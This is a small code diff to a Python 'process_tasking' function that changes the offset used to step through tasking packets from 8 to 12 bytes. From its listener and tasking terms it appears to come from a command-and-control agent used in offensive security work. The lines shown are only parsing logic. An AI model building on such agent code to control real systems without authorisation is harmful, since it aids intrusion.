@@ -202,7 +202,7 @@ def process_tasking(data):
         if result:
             resultPackets += result
 
-        packetOffset = 8 + length
+        packetOffset = 12 + length
 
         while remainingData and remainingData != '':
             (packetType, totalPacket, packetNum, resultID, length, data, remainingData) = parse_task_packet(tasking, offset=packetOffset)
@@ -210,7 +210,7 @@ def process_tasking(data):
             if result:
                 resultPackets += result
 
-            packetOffset += 8 + length
+            packetOffset += 12 + length
         
         # send_message() is patched in from the listener module
         send_message(resultPackets)
